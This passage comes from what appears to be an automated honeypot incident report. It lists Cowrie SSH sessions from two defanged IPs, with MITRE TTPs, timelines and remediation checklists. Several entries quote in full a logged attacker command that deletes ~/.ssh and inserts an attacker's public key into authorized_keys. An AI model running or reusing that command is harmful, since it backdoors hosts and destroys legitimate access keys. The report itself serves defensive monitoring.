| `2026-04-17 05:14:50` | `cowrie.client.kex` |
| `2026-04-17 05:14:52` | `cowrie.login.success` |
| `2026-04-17 05:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa60b14de4b

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:15 |
| **Last Seen** | 2026-04-17 05:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:15:38` | `cowrie.session.connect` |
| `2026-04-17 05:15:38` | `cowrie.client.version` |
| `2026-04-17 05:15:38` | `cowrie.client.kex` |
| `2026-04-17 05:15:38` | `cowrie.login.success` |
| `2026-04-17 05:15:39` | `cowrie.session.params` |
| `2026-04-17 05:15:39` | `cowrie.command.input` |
| `2026-04-17 05:15:39` | `cowrie.command.failed` |
| `2026-04-17 05:15:39` | `cowrie.log.closed` |
| `2026-04-17 05:15:39` | `cowrie.session.params` |
| `2026-04-17 05:15:39` | `cowrie.command.input` |
| `2026-04-17 05:15:39` | `cowrie.session.file_download` |
| `2026-04-17 05:15:39` | `cowrie.log.closed` |
| `2026-04-17 05:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8303ce5e907

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:15 |
| **Last Seen** | 2026-04-17 05:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:15:42` | `cowrie.session.connect` |
| `2026-04-17 05:15:42` | `cowrie.client.version` |
| `2026-04-17 05:15:42` | `cowrie.client.kex` |
| `2026-04-17 05:15:42` | `cowrie.login.success` |
| `2026-04-17 05:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4774387bfb

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:16 |
| **Last Seen** | 2026-04-17 05:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:16:40` | `cowrie.session.connect` |
| `2026-04-17 05:16:40` | `cowrie.client.version` |
| `2026-04-17 05:16:40` | `cowrie.client.kex` |
| `2026-04-17 05:16:41` | `cowrie.login.success` |
| `2026-04-17 05:16:42` | `cowrie.session.params` |
| `2026-04-17 05:16:42` | `cowrie.command.input` |
| `2026-04-17 05:16:42` | `cowrie.command.failed` |
| `2026-04-17 05:16:42` | `cowrie.log.closed` |
| `2026-04-17 05:16:43` | `cowrie.session.params` |
| `2026-04-17 05:16:43` | `cowrie.command.input` |
| `2026-04-17 05:16:44` | `cowrie.session.file_download` |
| `2026-04-17 05:16:44` | `cowrie.log.closed` |
| `2026-04-17 05:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8e7ac5b8005

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:16 |
| **Last Seen** | 2026-04-17 05:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:16:47` | `cowrie.session.connect` |
| `2026-04-17 05:16:47` | `cowrie.client.version` |
| `2026-04-17 05:16:48` | `cowrie.client.kex` |
| `2026-04-17 05:16:49` | `cowrie.login.success` |
| `2026-04-17 05:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d0ec3e0c579

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:18 |
| **Last Seen** | 2026-04-17 05:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:18:34` | `cowrie.session.connect` |
| `2026-04-17 05:18:34` | `cowrie.client.version` |
| `2026-04-17 05:18:34` | `cowrie.client.kex` |
| `2026-04-17 05:18:36` | `cowrie.login.success` |
| `2026-04-17 05:18:37` | `cowrie.session.params` |
| `2026-04-17 05:18:37` | `cowrie.command.input` |
| `2026-04-17 05:18:37` | `cowrie.command.failed` |
| `2026-04-17 05:18:37` | `cowrie.log.closed` |
| `2026-04-17 05:18:38` | `cowrie.session.params` |
| `2026-04-17 05:18:38` | `cowrie.command.input` |
| `2026-04-17 05:18:38` | `cowrie.session.file_download` |
| `2026-04-17 05:18:38` | `cowrie.log.closed` |
| `2026-04-17 05:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0502b9cb9804

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:18 |
| **Last Seen** | 2026-04-17 05:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:18:38` | `cowrie.session.connect` |
| `2026-04-17 05:18:38` | `cowrie.client.version` |
| `2026-04-17 05:18:38` | `cowrie.client.kex` |
| `2026-04-17 05:18:39` | `cowrie.login.success` |
| `2026-04-17 05:18:39` | `cowrie.session.params` |
| `2026-04-17 05:18:39` | `cowrie.command.input` |
| `2026-04-17 05:18:39` | `cowrie.command.failed` |
| `2026-04-17 05:18:40` | `cowrie.log.closed` |
| `2026-04-17 05:18:40` | `cowrie.session.params` |
| `2026-04-17 05:18:40` | `cowrie.command.input` |
| `2026-04-17 05:18:40` | `cowrie.session.file_download` |
| `2026-04-17 05:18:40` | `cowrie.log.closed` |
| `2026-04-17 05:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892fd5bf386b

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:18 |
| **Last Seen** | 2026-04-17 05:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:18:42` | `cowrie.session.connect` |
| `2026-04-17 05:18:42` | `cowrie.client.version` |
| `2026-04-17 05:18:42` | `cowrie.client.kex` |
| `2026-04-17 05:18:44` | `cowrie.login.success` |
| `2026-04-17 05:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe1f05c7da21

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:18 |
| **Last Seen** | 2026-04-17 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:18:47` | `cowrie.session.connect` |
| `2026-04-17 05:18:47` | `cowrie.client.version` |
| `2026-04-17 05:18:47` | `cowrie.client.kex` |
| `2026-04-17 05:18:47` | `cowrie.login.success` |
| `2026-04-17 05:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9dab467fb0

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:22 |
| **Last Seen** | 2026-04-17 05:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:22:13` | `cowrie.session.connect` |
| `2026-04-17 05:22:13` | `cowrie.client.version` |
| `2026-04-17 05:22:13` | `cowrie.client.kex` |
| `2026-04-17 05:22:15` | `cowrie.login.success` |
| `2026-04-17 05:22:15` | `cowrie.session.params` |
| `2026-04-17 05:22:15` | `cowrie.command.input` |
| `2026-04-17 05:22:15` | `cowrie.command.failed` |
| `2026-04-17 05:22:16` | `cowrie.log.closed` |
| `2026-04-17 05:22:17` | `cowrie.session.params` |
| `2026-04-17 05:22:17` | `cowrie.command.input` |
| `2026-04-17 05:22:17` | `cowrie.session.file_download` |
| `2026-04-17 05:22:17` | `cowrie.log.closed` |
| `2026-04-17 05:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c93232b6ff5

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:22 |
| **Last Seen** | 2026-04-17 05:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:22:21` | `cowrie.session.connect` |
| `2026-04-17 05:22:21` | `cowrie.client.version` |
| `2026-04-17 05:22:21` | `cowrie.client.kex` |
| `2026-04-17 05:22:23` | `cowrie.login.success` |
| `2026-04-17 05:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f912c2474f

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:24 |
| **Last Seen** | 2026-04-17 05:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:24:09` | `cowrie.session.connect` |
| `2026-04-17 05:24:09` | `cowrie.client.version` |
| `2026-04-17 05:24:09` | `cowrie.client.kex` |
| `2026-04-17 05:24:10` | `cowrie.login.success` |
| `2026-04-17 05:24:11` | `cowrie.session.params` |
| `2026-04-17 05:24:11` | `cowrie.command.input` |
| `2026-04-17 05:24:11` | `cowrie.command.failed` |
| `2026-04-17 05:24:11` | `cowrie.log.closed` |
| `2026-04-17 05:24:12` | `cowrie.session.params` |
| `2026-04-17 05:24:12` | `cowrie.command.input` |
| `2026-04-17 05:24:12` | `cowrie.session.file_download` |
| `2026-04-17 05:24:12` | `cowrie.log.closed` |
| `2026-04-17 05:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fee5aaf3a022

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:24 |
| **Last Seen** | 2026-04-17 05:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:24:16` | `cowrie.session.connect` |
| `2026-04-17 05:24:16` | `cowrie.client.version` |
| `2026-04-17 05:24:17` | `cowrie.client.kex` |
| `2026-04-17 05:24:18` | `cowrie.login.success` |
| `2026-04-17 05:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259ee21dee55

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:28 |
| **Last Seen** | 2026-04-17 05:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:28:00` | `cowrie.session.connect` |
| `2026-04-17 05:28:00` | `cowrie.client.version` |
| `2026-04-17 05:28:01` | `cowrie.client.kex` |
| `2026-04-17 05:28:02` | `cowrie.login.success` |
| `2026-04-17 05:28:03` | `cowrie.session.params` |
| `2026-04-17 05:28:03` | `cowrie.command.input` |
| `2026-04-17 05:28:03` | `cowrie.command.failed` |
| `2026-04-17 05:28:03` | `cowrie.log.closed` |
| `2026-04-17 05:28:04` | `cowrie.session.params` |
| `2026-04-17 05:28:04` | `cowrie.command.input` |
| `2026-04-17 05:28:04` | `cowrie.session.file_download` |
| `2026-04-17 05:28:04` | `cowrie.log.closed` |
| `2026-04-17 05:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0183028f90

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:28 |
| **Last Seen** | 2026-04-17 05:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:28:08` | `cowrie.session.connect` |
| `2026-04-17 05:28:08` | `cowrie.client.version` |
| `2026-04-17 05:28:09` | `cowrie.client.kex` |
| `2026-04-17 05:28:10` | `cowrie.login.success` |
| `2026-04-17 05:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617f2745234a

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:31 |
| **Last Seen** | 2026-04-17 05:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:31:54` | `cowrie.session.connect` |
| `2026-04-17 05:31:54` | `cowrie.client.version` |
| `2026-04-17 05:31:55` | `cowrie.client.kex` |
| `2026-04-17 05:31:56` | `cowrie.login.success` |
| `2026-04-17 05:31:57` | `cowrie.session.params` |
| `2026-04-17 05:31:57` | `cowrie.command.input` |
| `2026-04-17 05:31:57` | `cowrie.command.failed` |
| `2026-04-17 05:31:57` | `cowrie.log.closed` |
| `2026-04-17 05:31:58` | `cowrie.session.params` |
| `2026-04-17 05:31:58` | `cowrie.command.input` |
| `2026-04-17 05:31:58` | `cowrie.session.file_download` |
| `2026-04-17 05:31:58` | `cowrie.log.closed` |
| `2026-04-17 05:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21c84f33de25

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-17 05:32 |
| **Last Seen** | 2026-04-17 05:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 05:32:02` | `cowrie.session.connect` |
| `2026-04-17 05:32:02` | `cowrie.client.version` |
| `2026-04-17 05:32:03` | `cowrie.client.kex` |
| `2026-04-17 05:32:04` | `cowrie.login.success` |
| `2026-04-17 05:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2589986f0d2

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-17 05:32 |
| **Last Seen** | 2026-04-17 05:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
